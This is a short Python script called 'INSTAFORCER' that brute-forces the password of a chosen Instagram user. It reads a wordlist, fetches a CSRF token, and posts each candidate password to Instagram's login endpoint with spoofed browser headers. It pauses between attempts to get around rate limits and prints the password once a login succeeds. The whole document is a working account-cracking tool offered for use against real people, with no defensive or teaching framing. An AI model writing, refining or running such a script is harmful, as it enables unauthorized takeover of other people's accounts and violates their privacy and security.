import requests
import json
from datetime import datetime
import time

print("WELCOME TO INSTAFORCER, A PLACE WHERE PASSWORDS OF INSTAGRAM ACCOUNTS ARE CRACKED WITH EXCEPTIONAL EFFICIENCY\n")
time.sleep(2)

# here are the constants defined
username = input("Insert the username of the target(without @): ")
passw = input("Insert the name of the text file which will be utilised in hacking(without .txt): ")
passwords = open(f"{passw}.txt", 'r').readlines()

# actual cracking of the password
def main():
    for lines in passwords:
        link = "https://www.instagram.com/accounts/login/"
        login_url = "https://www.instagram.com/accounts/login/ajax/"
        password = lines.strip()
        response = requests.get(link)
        csrf_token = response.cookies['csrftoken']
        time_now = int(datetime.now().timestamp())
        payload = {
            'username': username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time_now}:{password}',
            'queryParams': {},
            'optIntoOneTap': 'false'
            }
        login_header = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': 'https://www.instagram.com/accounts/login/',
            'x-csrftoken': csrf_token
            }
        login_response = requests.post(login_url, data=payload, headers=login_header)
        json_data = json.loads(login_response.text)
        try:
            if json_data["authenticated"]:
                print(f"Login Successful: {password}\n")
                break
            else:
                print(f"Login Unsuccessful: {password}\n")
                time.sleep(3)
                continue
        except KeyError:
            print(f"Login Unsuccessful: {password}\nYour HTTP posts might have been blocked due to too many requests being made.")
            time.sleep(1)
            continue


if __name__ == '__main__':
    main()

